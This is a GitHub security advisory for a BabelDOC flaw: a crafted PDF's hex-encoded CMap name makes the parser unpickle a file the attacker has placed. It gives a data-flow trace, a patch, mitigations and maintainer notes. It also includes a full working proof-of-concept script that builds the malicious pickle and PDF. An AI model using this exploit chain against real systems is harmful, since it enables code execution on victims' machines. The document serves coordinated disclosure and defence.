# [H] BabelDOC: Arbitrary Code Execution via CMap Pickle Deserialization in babeldoc/pdfminer/cmapdb.py

## Summary
Severity: High
Advisory: GHSA-m8gf-v64p-gfmg
CVE: CVE-2026-54071
CWE: CWE-502
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-10
Source: https://github.com/advisories/GHSA-m8gf-v64p-gfmg
Type: github-advisory

## Affected
- PyPI: `BabelDOC` — affected >=0 <0.6.3

## Details
## Arbitrary Code Execution via CMap Pickle Deserialization in babeldoc/pdfminer/cmapdb.py

### Summary

BabelDOC's vendored PDF parser (`babeldoc/pdfminer/cmapdb.py`) deserializes untrusted pickle data when loading CMap files. The `_load_data()` method strips only NUL bytes from a PDF-controlled CMap name, then passes it directly to `os.path.join()` and `pickle.loads()`. Because Python's `os.path.join()` discards all preceding path components when it encounters an absolute path segment, an attacker who embeds a hex-encoded absolute path in a crafted PDF's `/Encoding` name (e.g., `/#2Ftmp#2Fattacker#2Fevil`) can redirect deserialization to any attacker-writable `.pickle.gz` file on the local system. Processing such a PDF results in arbitrary Python code execution with the privileges of the BabelDOC process.

### Details

The vulnerable function is `CMapDB._load_data()` at `babeldoc/pdfminer/cmapdb.py:232–245`:

```python
@classmethod
def _load_data(cls, name: str) -> Any:
    name = name.replace("\0", "")          # line 233 — only NUL is stripped
    filename = "%s.pickle.gz" % name       # line 234 — attacker-controlled string
    ...
    for directory in cmap_paths:
        path = os.path.join(directory, filename)   # line 241 — no realpath/canonical check
        if os.path.exists(path):
            gzfile = gzip.open(path)
            try:
                return type(str(name), (), pickle.loads(gzfile.read()))  # line 245 — unconditional pickle
```

**Path injection via PDF name hex-encoding.** The PDF specification allows name objects to encode arbitrary bytes as `#xx`. The pdfminer literal-name parser (`psparser._parse_literal_hex`) decodes these sequences before handing the string to higher layers. Consequently, the PDF literal `/#2Ftmp#2Fattacker#2Fevil` is decoded to the Python string `/tmp/attacker/evil`.

**Python `os.path.join()` absolute-path override.** When the decoded name starts with `/` (i.e., it is an absolute path), Python's `os.path.join(directory, name + ".pickle.gz")` ignores `directory` entirely and returns the absolute path unchanged. The trusted `cmap_paths` directories (`/usr/share/pdfminer/`, the package's own `cmap/` folder) are therefore completely bypassed.

**Data flow from PDF to sink:**

1. `babeldoc/main.py:611–622` — CLI accepts a PDF path; only existence and `.pdf` suffix are checked.
2. `babeldoc/main.py:678–679` — path stored in `TranslationConfig(input_file=file)`.
3. `babeldoc/format/pdf/high_level.py:472–488` — `translation_config.input_file` enters the translate pipeline.
4. `babeldoc/format/pdf/high_level.py:805–848` — PDF saved to `temp_pdf_path` and parsed with `parse_prepared_pdf_with_new_parser_to_legacy_ir`.
5. `babeldoc/format/pdf/new_parser/native_parse.py:60–70` — prepared pages loaded and interpreted.
6. `babeldoc/format/pdf/new_parser/pymupdf_prepared_page_access.py:25–34` — PyMuPDF opens the PDF and builds page resources.
7. `babeldoc/format/pdf/new_parser/prepared_resource_builder.py:84–94` — font resources converted to `PreparedFontSpec`.
8. `babeldoc/format/pdf/new_parser/active_font_resource_runtime.py:21–35` — page resource bundle resolves root font map.
9. `babeldoc/format/pdf/new_parser/active_font_runtime.py:79–87` — each font spec projected and passed to `font_factory.create_font`.
10. `babeldoc/format/pdf/new_parser/active_direct_font_backend.py:291–292, 491–493` — CID fonts call `build_cid_cmap(spec, literal_name=literal_name)`.
11. `babeldoc/format/pdf/new_parser/runtime/cid_cmap_runtime.py:52–77` — PDF-controlled `/Encoding`/`CMapName` normalized and passed to `CMapDB.get_cmap`. `_normalize_cmap_name()` removes only a single leading `/`; all other path characters pass through.
12. `babeldoc/pdfminer/cmapdb.py:233–245` — **sink**: NUL-stripped name used verbatim to construct the path; file opened with gzip and deserialized with `pickle.loads()`.

**Sanitization gaps:**

- `name.replace("\0", "")` removes only the NUL byte; `..`, `/`, `\`, and hex-decoded path separators are unaffected.
- There is no `os.path.realpath()`, `os.path.abspath()`, or `os.path.commonpath()` containment check before the file is opened.
- There is no allowlist of known CMap names nor any integrity verification of the pickle data.

**Recommended patch** (`babeldoc/pdfminer/cmapdb.py`):

```diff
--- a/babeldoc/pdfminer/cmapdb.py
+++ b/babeldoc/pdfminer/cmapdb.py
@@
         cmap_paths = (
             os.environ.get("CMAP_PATH", "/usr/share/pdfminer/"),
             os.path.join(os.path.dirname(__file__), "cmap"),
         )
         for directory in cmap_paths:
-            path = os.path.join(directory, filename)
+            base_dir = os.path.realpath(directory)
+            path = os.path.realpath(os.path.join(base_dir, filename))
+            try:
+                if os.path.commonpath([base_dir, path]) != base_dir:
+                    continue
+            except ValueError:
+                continue
             if os.path.exists(path):
                 gzfile = gzip.open(path)
```

A more complete fix replaces the pickle-backed CMap loader with a signed or static data format (e.g., JSON or generated Python modules) that does not carry executable code.

### PoC

**Environment setup (Docker — recommended for isolation):**

```bash
# From the repository root
docker build -t vuln-001-babeldoc-cmap -f vuln-001/Dockerfile .
docker run --rm vuln-001-babeldoc-cmap
```

**Manual setup (local venv):**

```bash
python3 -m venv /tmp/babeldoc-poc-venv
source /tmp/babeldoc-poc-venv/bin/activate
pip install freetype-py==2.5.1 charset-normalizer cryptography
export PYTHONPATH=/path/to/BabelDOC
python3 poc.py
```

**PoC script (`poc.py`) — key steps:**

```python
import gzip, pathlib, pickle, sys

CMAP_STAGING_DIR = pathlib.Path("/tmp/babeldoc-cmap-poc")
MALICIOUS_PICKLE = CMAP_STAGING_DIR / "malicious.pickle.gz"
MALICIOUS_PDF    = CMAP_STAGING_DIR / "malicious.pdf"
PROOF_FILE       = pathlib.Path("/tmp/babeldoc_cmap_rce_proof.txt")

# Step 1 — write the malicious pickle to a world-writable location
class MaliciousPayload:
    def __reduce__(self):
        return (pathlib.Path(str(PROOF_FILE)).write_text,
                ("RCE_CONFIRMED: pickle.loads executed attacker payload",))

CMAP_STAGING_DIR.mkdir(parents=True, exist_ok=True)
with gzip.open(MALICIOUS_PICKLE, "wb") as fh:
    pickle.dump(MaliciousPayload(), fh)

# Step 2 — craft a PDF whose /Encoding name hex-encodes the absolute path
# "/#2Ftmp#2Fbabeldoc-cmap-poc#2Fmalicious" decodes to "/tmp/babeldoc-cmap-poc/malicious"
encoding_name = b"/#2Ftmp#2Fbabeldoc-cmap-poc#2Fmalicious"

# ... (minimal PDF structure with a Type0 CID font referencing encoding_name) ...
# Full source in poc.py

# Step 3 — trigger via the pdfminer high-level API
from babeldoc.pdfminer.high_level import extract_text
try:
    extract_text(str(MALICIOUS_PDF))
except TypeError:
    pass  # expected: type(name, (), <int>) fails after write_text returns int

# Step 4 — verify
assert PROOF_FILE.exists(), "FAIL: proof file not created"
print(PROOF_FILE.read_text())  # => "RCE_CONFIRMED: pickle.loads executed attacker payload"
```

**Phase 2 dynamic reproduction output (Docker container):**

```
[+] Malicious pickle written: /tmp/babeldoc-cmap-poc/malicious.pickle.gz
[+] Malicious PDF written: /tmp/babeldoc-cmap-poc/malicious.pdf
[*] Calling extract_text(/tmp/babeldoc-cmap-poc/malicious.pdf) ...
[*] extract_text raised TypeError: type.__new__() argument 3 must be dict, not int
[*] This exception is expected; the payload ran before it.

============================================================
RESULT: PASS
Proof file: /tmp/babeldoc_cmap_rce_proof.txt
Content:    'RCE_CONFIRMED: pickle.loads executed attacker payload'
============================================================
```

The `TypeError` is benign and expected: `write_text()` returns an integer, and the subsequent `type(name, (), <int>)` call in `_load_data()` raises before reaching further code. The payload already executed successfully at that point.

**Attack path summary:**

```
PDF /Encoding  /#2Ftmp#2Fbabeldoc-cmap-poc#2Fmalicious
  -> pdfminer hex-decodes #2F -> '/'
  -> literal_name = "/tmp/babeldoc-cmap-poc/malicious"
  -> CMapDB._load_data("/tmp/babeldoc-cmap-poc/malicious")
  -> filename = "/tmp/babeldoc-cmap-poc/malicious.pickle.gz"   # absolute path!
  -> os.path.join("/usr/share/pdfminer/", "/tmp/.../malicious.pickle.gz")
     == "/tmp/babeldoc-cmap-poc/malicious.pickle.gz"           # first arg discarded
  -> gzip.open() + pickle.loads() -> arbitrary code execution
```

### Impact

This is an **Arbitrary Code Execution** vulnerability triggered by processing a crafted PDF file. Any user or automated pipeline that runs BabelDOC against untrusted PDF input is at risk.

**Who is impacted:**

- **End users** who open a malicious PDF with the `babeldoc` CLI or any application embedding BabelDOC's PDF translation/text-extraction functionality.
- **Automated document processing pipelines** (CI translation services, document management systems, cloud PDF processors) that ingest user-supplied PDFs without sandboxing.

**Attack prerequisites:**

1. The attacker must be able to place a `.pickle.gz` file at a predictable path on the local filesystem (e.g., `/tmp/`), or exploit a shared world-writable directory. On Windows systems, UNC/WebDAV paths may provide a remote staging alternative.
2. The victim must process the crafted PDF through BabelDOC. No elevated privileges or special configuration is required — default PDF processing is the vulnerable code path.

**Scope:** The attack crosses security boundaries (e.g., a lower-privileged attacker influencing files processed by a different user's process), justifying the **Changed** scope in the CVSS vector and potential lateral movement between users on multi-user systems.

**Consequences:** Full code execution with the victim process's privileges — confidentiality breach, data modification, denial of service, and potential privilege escalation depending on the deployment context.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM python:3.11-slim

# Install system-level dependencies for freetype
RUN apt-get update && apt-get install -y --no-install-recommends \
    libfreetype6 \
    && rm -rf /var/lib/apt/lists/*

# Install minimal Python dependencies required by babeldoc/pdfminer
RUN pip install --no-cache-dir \
    freetype-py==2.5.1 \
    charset-normalizer \
    cryptography

# Copy the BabelDOC repository (only babeldoc package directory is needed)
COPY repo/babeldoc /app/babeldoc

# Copy the PoC script
COPY vuln-001/poc.py /app/poc.py

WORKDIR /app

# PYTHONPATH exposes babeldoc package without a full pip install
ENV PYTHONPATH=/app

CMD ["python3", "poc.py"]
```

#### `poc.py`

```python
"""
PoC: CMap Pickle Deserialization via Absolute Path Injection
CVE Candidate: VULN-001 in funstory-ai/BabelDOC v0.6.2

Vulnerability: babeldoc/pdfminer/cmapdb.py _load_data() only strips NUL bytes
from the CMap name before building a filesystem path.  A PDF name object
using #xx hex-encoding can inject absolute path characters (/) so that
os.path.join() discards the trusted cmap directory entirely, opening and
unpickling an attacker-placed .pickle.gz file.

Attack flow:
  PDF /Encoding  /#2Ftmp#2F...#2Fmalicious
    -> pdfminer hex-decodes #2F -> '/'
    -> literal_name() returns "/tmp/.../malicious"
    -> _load_data("/tmp/.../malicious")
    -> filename = "/tmp/.../malicious.pickle.gz"   (absolute path!)
    -> os.path.join("/usr/share/pdfminer/", "/tmp/.../malicious.pickle.gz")
       == "/tmp/.../malicious.pickle.gz"            (Python discards first arg)
    -> gzip.open() + pickle.loads() => arbitrary code execution
"""

import gzip
import os
import pathlib
import pickle
import sys

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
CMAP_STAGING_DIR = pathlib.Path("/tmp/babeldoc-cmap-poc")
MALICIOUS_PICKLE = CMAP_STAGING_DIR / "malicious.pickle.gz"
MALICIOUS_PDF = CMAP_STAGING_DIR / "malicious.pdf"
PROOF_FILE = pathlib.Path("/tmp/babeldoc_cmap_rce_proof.txt")


# ---------------------------------------------------------------------------
# Step 1: Build the malicious pickle payload
# ---------------------------------------------------------------------------
class MaliciousPayload:
    """Pickle payload that writes a proof file on deserialization."""

    def __reduce__(self):
        # Write proof file when unpickled; any writable command works here.
        return (
            pathlib.Path(str(PROOF_FILE)).write_text,
            ("RCE_CONFIRMED: pickle.loads executed attacker payload",),
        )


def create_malicious_pickle():
    CMAP_STAGING_DIR.mkdir(parents=True, exist_ok=True)
    PROOF_FILE.unlink(missing_ok=True)

    with gzip.open(MALICIOUS_PICKLE, "wb") as fh:
        pickle.dump(MaliciousPayload(), fh)

    print(f"[+] Malicious pickle written: {MALICIOUS_PICKLE}")


# ---------------------------------------------------------------------------
# Step 2: Build the malicious PDF
# ---------------------------------------------------------------------------
def create_malicious_pdf():
    """
    Craft a minimal PDF with a Type0 CID font whose /Encoding name is a
    PDF literal that hex-encodes an absolute Unix path.

    PDF name syntax: /<characters>  where #xx is hex escape for byte 0xxx.
    "/#2Ftmp#2Fbabeldoc-cmap-poc#2Fmalicious" decodes to the name value
    "/tmp/babeldoc-cmap-poc/malicious" (starts with '/').

    When passed through babeldoc/pdfminer:
      literal_name(PSLiteral) -> "/tmp/babeldoc-cmap-poc/malicious"
      _load_data()  -> filename = "/tmp/babeldoc-cmap-poc/malicious.pickle.gz"
      os.path.join("/usr/share/pdfminer/", "/tmp/.../malicious.pickle.gz")
        => "/tmp/babeldoc-cmap-poc/malicious.pickle.gz"  (absolute wins!)
    """
    # Hex-encoded encoding name: /tmp/babeldoc-cmap-poc/malicious
    # '#2F' = '/' in PDF name hex encoding
    encoding_name = b"/#2Ftmp#2Fbabeldoc-cmap-poc#2Fmalicious"

    content_stream = b"BT\n/F1 12 Tf\n100 700 Td\n(Malicious PDF) Tj\nET\n"

    # PDF objects (1-indexed)
    objs = [
        # 1: Catalog
        b"<< /Type /Catalog /Pages 2 0 R >>",
        # 2: Pages
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        # 3: Page - references content stream (4) and font (5)
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]"
        b" /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
        # 4: Content stream
        b"<< /Length %d >>\nstream\n" % len(content_stream)
        + content_stream
        + b"\nendstream",
        # 5: Type0 font with malicious /Encoding name
        b"<< /Type /Font /Subtype /Type0 /BaseFont /MalFont"
        b" /Encoding " + encoding_name + b""
        b" /DescendantFonts [6 0 R] >>",
        # 6: CIDFontType2 descendant
        b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /MalFont"
        b" /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity)"
        b" /Supplement 0 >> /FontDescriptor 7 0 R >>",
        # 7: FontDescriptor (minimal)
        b"<< /Type /FontDescriptor /FontName /MalFont /Flags 4"
        b" /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0"
        b" /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80 >>",
    ]

    buf = bytearray(b"%PDF-1.4\n")
    offsets = []
    for i, obj_data in enumerate(objs, 1):
        offsets.append(len(buf))
        buf += f"{i} 0 obj\n".encode() + obj_data + b"\nendobj\n"

    xref_offset = len(buf)
    buf += f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode()
    for off in offsets:
        buf += f"{off:010d} 00000 n \n".encode()
    buf += (
        f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\n"
        f"startxref\n{xref_offset}\n%%EOF\n"
    ).encode()

    MALICIOUS_PDF.write_bytes(bytes(buf))
    print(f"[+] Malicious PDF written: {MALICIOUS_PDF}")


# ---------------------------------------------------------------------------
# Step 3: Trigger the vulnerability via babeldoc pdfminer extract_text
# ---------------------------------------------------------------------------
def trigger_exploit():
    from babeldoc.pdfminer.high_level import extract_text

    print(f"[*] Calling extract_text({MALICIOUS_PDF}) ...")
    try:
        result = extract_text(str(MALICIOUS_PDF))
        print(f"[+] extract_text completed, returned {len(result)} chars")
    except Exception as exc:
        # A TypeError is expected: after pickle.loads() returns the result of
        # write_text() (an int), the code tries type(name, (), <int>) which
        # raises TypeError.  The write has already happened at this point.
        print(f"[*] extract_text raised {type(exc).__name__}: {exc}")
        print("[*] This exception is expected; the payload ran before it.")


# ---------------------------------------------------------------------------
# Step 4: Verify RCE evidence
# ---------------------------------------------------------------------------
def verify_rce():
    if PROOF_FILE.exists():
        content = PROOF_FILE.read_text()
        print()
        print("=" * 60)
        print("RESULT: PASS")
        print(f"Proof file: {PROOF_FILE}")
        print(f"Content:    {content!r}")
        print("=" * 60)
        return True
    else:
        print()
        print("=" * 60)
        print("RESULT: FAIL")
        print(f"Proof file {PROOF_FILE} was NOT created.")
        print("=" * 60)
        return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    print("=== VULN-001 PoC: CMap Pickle Deserialization via Path Injection ===")
    print(f"Python: {sys.version}")
    print()

    create_malicious_pickle()
    create_malicious_pdf()
    trigger_exploit()
    success = verify_rce()

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
```

---

## Notes from the maintainer

### CVSS revision note

The CVSS v3.1 vector has been revised from the reporter's initial
`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` (8.6) to
`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` (7.8) on maintainer
review. The severity rating remains **High**.

One metric is revised; the remaining metrics (`AV:L`, `AC:L`, `PR:N`,
`UI:R`, `C:H/I:H/A:H`) are unchanged from the reporter's assessment.

- **Scope: Changed → Unchanged.** BabelDOC is a PDF-processing
  library running with the caller process's operating-system
  permissions; it does not enforce a separate security authority over
  OS files, users, or downstream services. The malicious pickle
  payload executes in that same BabelDOC Python process. Under CVSS
  v3.1, this is Scope Unchanged: the vulnerable component and the
  impacted component are governed by the same authority. No sandbox,
  VM, browser-client, or application-defined authorization boundary
  is crossed.

The remaining metrics are retained intentionally:

- `AV:L`, `PR:N`, `UI:R`: the attack requires local presence of
  attacker-influenced data (consistent with `AV:L`), does not require
  authenticated access to BabelDOC itself (`PR:N`), and depends on a
  user actually processing the crafted PDF (`UI:R`).
- `AC:L`: kept aligned with industry practice for CWE-502
  deserialization issues; once the supporting filesystem condition
  exists, the same-process exploitation path is consistent and
  repeatable.
- `C:H`, `I:H`, `A:H`: full code-execution impact within the
  BabelDOC process.

We thank EQSTLab for the detailed report and PoC; this revision is
limited to CVSS metric interpretation, and the issue remains High
severity when exploitable.

### Full sink coverage (2 independently exploitable PDF paths + 2 defense-in-depth call sites)

The original report covers entry point (1): the `Encoding` / `CMapName`
font dictionary path, with absolute-path injection. Local review during
patch preparation identified that the same `_load_data` sink is reached
from one additional independently exploitable PDF-controlled path and
two prefixed call sites covered at the sink for defense in depth:

1. `Encoding` / `CMapName` references in a font dictionary
   *(reported entry; absolute-path injection per the upstream report,
   `..` relative traversal also exploitable)*
2. The PostScript `usecmap` operator inside an embedded CMap stream
   *(independently exploitable via `..` relative traversal; not in the
   original report)*
3. `CIDSystemInfo.Ordering` flowing through `get_unicode_map` in the
   legacy pdfminer pipeline
4. `CIDSystemInfo.Ordering` flowing through `get_unicode_map` in the
   active new-parser pipeline

Call sites (3) and (4) were not reproduced as standalone PDF-only
exploit paths in v0.6.x. The `get_unicode_map` caller prepends a
`to-unicode-` prefix to the PDF-controlled name, which breaks
absolute-path injection and means `..` traversal would require an
additional crafted directory layout such as a `to-unicode-*`
component under a CMap search location. The 0.6.3 sink-level fix
still covers these call sites, so future removal of the prefix or
a future unprefixed caller remains blocked.

### Fix design

The runtime CMap loader in 0.6.3 refuses to deserialize any file that
does not simultaneously:

1. appear in a pinned manifest of bundled CMap filenames (allowlist),
2. resolve inside the bundled `runtime/data/cmap` directory after path
   resolution (containment check), and
3. byte-for-byte match the manifest's pinned byte size and SHA-256.

The integrity check runs on the compressed on-disk `.gz` bytes before
decompression, so files whose compressed size or SHA-256 differs from
the pinned manifest are rejected before `gzip` or `pickle` sees them.
The legacy `CMAP_PATH` external search path is removed entirely; only
the bundled directory is consulted. The active new-parser pipeline
and the vendored pdfminer pipeline share the same verified-load entry
point.

### Related hardening shipped in 0.6.3

A separate hardening in the same release sanitizes PDF-controlled
XObject names before they reach the optional `ImageWriter` output
path, preventing PDF-driven writes outside the configured output
directory. This is separate from BabelDOC's default translation
pipeline: the optional `ImageWriter` is not used by default and is
only reachable when a third-party caller passes an explicit
`output_dir`. It is included here for completeness.

### Risk reduction if you cannot upgrade immediately

These steps reduce known exploit preconditions on pre-0.6.3 versions;
they are not equivalent to the 0.6.3 fix.

- Do not set the `CMAP_PATH` environment variable when running
  BabelDOC. 0.6.3 removes this variable entirely; on pre-0.6.3
  versions, unsetting it limits the attack surface to the bundled
  cmap directory under the BabelDOC package.
- Run BabelDOC under an account that cannot create files in any
  directory BabelDOC will read CMap data from, including any
  pre-0.6.3 `CMAP_PATH` target.
- Process only PDFs from trusted sources until upgrading.

### Maintenance policy

BabelDOC publishes security fixes only in the latest release. We do
not publish maintainer-supported backports for older minor, patch, or
release lines. For this advisory, the maintainer-supported fixed
version is 0.6.3 or later; downstream distributors may carry their
own patches, but older BabelDOC releases will not receive a separate
upstream backport.

### Acknowledgements

We thank **EQSTLab** for the detailed private report, complete
reproduction material, and coordinated-disclosure cooperation that
allowed this fix to be prepared and released before public
disclosure.

### Timeline

- 2026-06-03 04:34 UTC: EQSTLab opens the private advisory draft and
  notifies maintainers
- 2026-06-03 09:21 UTC: BabelDOC 0.6.3 released with the fix
- 2026-06-03 09:50 UTC: this advisory published
- TBD: CVE identifier assigned (pending GitHub CNA review; GitHub
  documentation says CVE requests are usually reviewed within 72
  hours)

### References

- BabelDOC 0.6.3 release notes:
  https://github.com/funstory-ai/BabelDOC/blob/main/docs/release-notes/v0.6.3.md
- CVE: TBD (pending CNA assignment)

## References
- https://github.com/funstory-ai/BabelDOC/security/advisories/GHSA-m8gf-v64p-gfmg
- https://github.com/funstory-ai/BabelDOC
